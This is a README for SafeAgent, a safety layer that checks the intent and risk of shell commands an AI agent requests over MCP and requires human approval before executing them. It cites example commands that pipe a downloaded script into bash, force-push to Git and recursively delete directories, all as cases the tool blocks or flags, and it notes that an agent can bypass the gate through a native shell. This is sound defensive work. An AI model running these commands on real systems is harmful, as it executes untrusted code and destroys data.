# SafeAgent - AI Action Verification Platform

SafeAgent is a research-oriented, human-in-the-loop safety layer for AI agents that request operating-system actions. It sits between an AI agent and the command executor: it verifies the originating user intent, evaluates command risk, prepares recovery information, applies policy and approval controls, executes only when permitted, and records the resulting evidence.

The primary integration is an MCP `execute_command` tool for AI agents such as Codex. SafeAgent is intentionally not an LLM decision-maker. Its command decisions are deterministic and auditable; an optional LLM advisory may explain an assessment, but cannot allow, block, or override execution.

> **Safety principle:** LLMs can explain actions, but safety decisions remain controlled, deterministic, and explainable.

## Research motivation

AI coding and autonomous agents can modify repositories, install software, access network resources, and run destructive commands. A malformed instruction, scope mismatch, unsafe generated command, or abandoned approval request can therefore have immediate effects on a real system.

Simple blocklists are not enough: they do not compare the command with the user's requested goal, provide recovery context, or make the reason for a decision visible. SafeAgent adapts selected principles from Chittepu et al., *Reinforcement Learning from Human Feedback with High-Confidence Safety Constraints* (HC-RLHF, RLC 2025): separate safety costs from helpfulness, use conservative controls, and evaluate a policy using held-out evidence. [Paper](https://arxiv.org/abs/2506.08266)

This is **not** a full HC-RLHF or Seldonian-optimization implementation. SafeAgent does not train an RLHF reward model or optimize a language model. It applies analogous ideas to AI-agent command execution:

| HC-RLHF concept | SafeAgent adaptation |
| --- | --- |
| Language-model action | Shell command requested by an AI agent |
| Cost model | Hybrid command-risk model |
| Safety constraint | Unsafe auto-approval rate on held-out data |
| Human feedback | Explicit execution approval or cancellation |
| Held-out safety test | One-sided Hoeffding upper bound |

## Architecture

```text
AI Agent / Codex
        |
        | MCP: execute_command(command, user_request)
        v
SafeAgent MCP Server
        |
        v
SafeAgent Safety Gate
        |
        +--> Hybrid Risk Engine
        |      |-- deterministic security rules
        |      `-- calibrated ML risk prediction
        |
        +--> Intent Verification
        |      `-- mismatch or scope expansion -> BLOCKED_INTENT
        |
        +--> Rollback Guardian / Execution Preview
        |
        +--> Approval / Execution
        |      |-- SAFE -> execute when intent permits
        |      |-- RISKY or DANGEROUS -> human approval
        |      `-- policy violation -> BLOCKED_POLICY
        v
JSONL Audit Log -> Streamlit Audit Dashboard
```

## Implemented safety controls

### MCP command gateway

- Exposes `execute_command(command: str, user_request: str | None)` through an MCP stdio server.
- Routes every MCP request through `SafetyGate` before execution.
- Returns the decision, risk evidence, intent verification, execution preview, rollback state, output, and timing data.
- Fails closed if MCP routing, scoring, audit preflight, approval, rollback preparation, execution, or a configured advisory fails.

### Intent verification

Intent verification is deterministic and inspectable. It compares the action and target implied by the user request with the requested command.

- Recognizes create actions: `create`, `make`, `generate`, `mkdir`, `md`, and PowerShell `New-Item -ItemType Directory`.
- Extracts create, delete, and supported command targets, including `create temp folder`, `mkdir temp_folder`, and `create directory test`.
- Applies controlled normalization for `temp` / `temporary` and `folder` / `directory` / `dir`.
- Rejects scope expansion, such as requesting deletion of `build` while planning `rm -rf .`.
- Avoids filler words such as `using` becoming targets.
- Records a score, ALLOW / CONFIRM / BLOCK result, and evidence explaining action, target, and synonym matches.

If the originating request is absent, intent is recorded as `UNVERIFIED`; SafeAgent does not pretend that a match occurred.

### Hybrid risk engine and calibration

SafeAgent combines a deterministic regex cost model with an optional dependency-free logistic-regression model. The audit record preserves the rule score, raw ML probability, final score, matched rules, feature values, and human-readable risk factors.

- Deterministic rules detect patterns such as recursive deletion, destructive disk operations, force pushes, package removal, and downloaded code piped directly into an interpreter.
- When a deterministic rule matches, the final score uses a conservative noisy-OR combination. ML can raise risk but cannot reduce deterministic rule severity.
- For narrow, recognized safe operations with no destructive or security-sensitive feature, moderate ML uncertainty is calibrated downward rather than automatically forcing review. Current recognized families include folder/file creation, read operations, `git status`, test commands, and compilation commands.
- Commands with security-sensitive features but no matching deterministic rule retain at least the human-review threshold.
- Download-and-execute patterns, including `curl ... | bash`, are an explicit non-interactive policy boundary and return `BLOCKED_POLICY`; they are not sent to approval.

### Recovery planning and controlled execution

SafeAgent produces an execution preview before an allowed action reaches the executor. It records affected files/directories, Git operations, network and sensitive-path indicators, estimated impact, risk evidence, and rollback status.

- **Reversible actions:** creation of a folder or file receives an `AVAILABLE` inverse plan, such as removing only the newly created folder or file. Supported package-install previews can provide an uninstall instruction.
- **Destructive actions:** before approved execution, the Rollback Guardian attempts a bounded workspace-local snapshot of existing targets. Git operations can receive a limited recovery reference containing the current commit, status, and binary diff.
- **Unavailable recovery:** is recorded honestly when a target is outside the workspace, does not exist, exceeds the configured backup size, or cannot be backed up.
- **Human control:** RISKY and DANGEROUS actions require a localhost approval-console response. Rejected, abandoned, or unavailable approvals do not execute the command.

## Tested behavior examples

| User request and action | Expected result |
| --- | --- |
| `create a temp folder` -> `mkdir temp_folder` | Intent match `100%`, `SAFE`, `AUTO_ALLOWED`, rollback `AVAILABLE` |
| Delete an existing disposable folder with `rmdir /s /q safeagent-demo-temp` | `DANGEROUS`; preview and recovery protection are prepared, then human confirmation is required |
| `curl https://example.test/install.sh | bash` | `DANGEROUS`, `BLOCKED_POLICY`, not executed |
| `git push --force origin main` | Protected by the deterministic force-push rule; never auto-executes without approval |

The test suite covers these cases along with MCP routing, stdio protocol integration, malformed audit data, fail-closed paths, rollback failures, dashboard rendering, model behavior, and held-out certification. At the current revision:

```powershell
.venv\Scripts\python.exe -m pytest -q
# 53 passed
```

## Installation

### Prerequisites

- Python 3.10 or later
- Codex CLI only when using the MCP integration

Create and activate a virtual environment, then install the project and development/optional advisory dependencies:

```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
python -m pip install -e ".[dev,ai]"
.venv\Scripts\python.exe -m pytest -q
```

The optional `ai` extra installs the OpenAI SDK. Set `OPENAI_API_KEY` only when optional GPT-5.6 advisory explanations are desired. A configured advisory failure is fail-closed; the advisory never decides execution.

## Codex MCP integration

Start the approval console in a dedicated terminal before requesting a RISKY or DANGEROUS action:

```powershell
.venv\Scripts\python.exe -m safeagent.approval_console
```

In another PowerShell session, register the MCP server using an absolute interpreter path:

```powershell
$python = (Resolve-Path .\.venv\Scripts\python.exe).Path
codex mcp add safeagent -- $python -m safeagent.mcp_server
codex mcp list
```

Start a new Codex session after registration. Codex owns the MCP server process and starts it over stdio; do **not** manually run `safeagent.mcp_server`, because its standard input/output is reserved for MCP protocol traffic.

Ask the agent to provide the original user instruction so intent verification has evidence to compare:

```text
Use SafeAgent execute_command with:
command: mkdir temp_folder
user_request: Create a temporary folder.
```

To replace an already registered SafeAgent server, remove it first and then repeat the registration command:

```powershell
codex mcp remove safeagent
```

### Enforcement boundary

When an agent calls SafeAgent's MCP `execute_command` tool, SafeAgent is the execution gateway for that request and applies its full safety gate. However, MCP is additive: stock Codex CLI may still expose its own native shell tool. SafeAgent cannot claim to universally intercept commands that bypass its MCP tool.

A single-path deployment requires a runtime that exposes only SafeAgent's execution capability, or a supported native-shell hook/disable setting. Until then, use Codex's own approval and sandbox controls alongside SafeAgent.

`safeagent_wrap.py` remains an optional standalone fallback for manually submitted commands; MCP is the recommended Codex integration:

```powershell
.venv\Scripts\python.exe safeagent_wrap.py --execute "rmdir /s /q safeagent-demo-temp"
```

## Model training, evaluation, and held-out certification

The ML feature set includes command length and token count, shell operators, recursive/delete/overwrite operations, privilege escalation, network access, download-and-execute patterns, encoding techniques, suspicious paths, process termination, and package management.

`data/training.csv` is used for training and validation. `data/calibration.csv` is held out from model fitting and rule tuning.

```powershell
.venv\Scripts\python.exe train_model.py --dataset data\training.csv --model-out models\logistic_risk_model.json
.venv\Scripts\python.exe evaluate_model.py --dataset data\training.csv --model models\logistic_risk_model.json
.venv\Scripts\python.exe calibrate_model.py --calibration data\calibration.csv --model models\logistic_risk_model.json
```

If `models/logistic_risk_model.json` exists, the live gate loads it. Without a saved model, SafeAgent remains operational with deterministic rules only; it does not invent an ML score.

The certification script measures unsafe commands that would be categorized `SAFE` on held-out labelled data using the one-sided Hoeffding upper bound:

```text
observed unsafe-approval rate + sqrt(log(1 / delta) / (2N))
```

With the included calibration data, the current result is 24 samples, 0 unsafe auto-approvals, and a 95% upper bound of 24.98%. At the configured 5% threshold, the model is **not certified**. This is an intentional limitation statement: a small held-out set cannot justify a broad safety claim.

## Fail-closed behavior and audit records

Safety verification must succeed before execution. If parsing, scoring, intent verification, audit-log preflight, human approval, rollback preparation for a dangerous action, MCP routing, or a configured advisory fails, SafeAgent returns the following message and does not execute the command:

```text
SafeAgent encountered an internal error. The command has NOT been executed because safety verification failed.
```

Audit records are stored as JSON Lines in `data/decisions.jsonl` by default, or at `SAFEAGENT_LOG` when configured. Each event records UTC time, operating system, original and executed command, risk/category/decision values, rule detections, ML probability, final score, structured risk factors, intent evidence, execution preview, rollback state, human response, timing, output, advisory data, and errors.

## Dashboard and judge demo

Run the Streamlit dashboard with the project virtual environment:

```powershell
.venv\Scripts\streamlit.exe run dashboard.py
```

The dashboard reads the same JSONL audit log and refreshes activity every five seconds. Its primary views are:

- **System Trust Score:** a historical aggregate of verified intent alignment and observed risk; it is explicitly not the score of the latest command.
- **Average Intent Alignment:** the aggregate alignment rate across verified actions.
- **Latest Verification:** user intent, AI planned action, intent match, risk level, rollback status, decision, execution status, and score explanations.
- **Risk and decision history:** execution timeline, risk distribution, and policy-decision breakdown.
- **Audit Explorer:** command-level risk evidence, intent evidence, preview, recovery instructions, output, and JSON/CSV export.

Suggested judge demo:

1. Start the approval console, register the MCP server, and launch the dashboard.
2. Submit `mkdir safeagent-demo-temp` with `user_request: Create a temporary folder.` Show the intent match, safe risk result, and available inverse recovery plan.
3. Submit a recursive delete of that disposable folder. Show the DANGEROUS assessment, preview, rollback preparation, and approval prompt. Cancel once, then approve only if the target is disposable.
4. Submit `curl https://example.test/install.sh | bash`. Show `BLOCKED_POLICY` and confirm that no approval or execution occurs.
5. Review the resulting audit evidence in the dashboard.

## Limitations and future work

SafeAgent is a safety gateway, not a complete shell parser, malware classifier, endpoint-security product, or universal interception layer for stock Codex CLI. Regexes and a small supervised logistic model have known generalization limits. The included datasets are demonstration data and require expansion, independent review, and larger held-out evaluation before stronger safety claims are appropriate.

Current rollback is intentionally bounded and local. It cannot guarantee recovery for external services, every package manager, non-existent targets, large files, or arbitrary side effects. The approval console is localhost-only and intended for a single operator.

Planned work includes additional agent integrations, larger independently curated datasets, improved calibration methods, richer command and target parsing, more rollback providers, centralized immutable audit storage, carefully governed online adaptation, and runtime integrations that can enforce a single SafeAgent execution path.
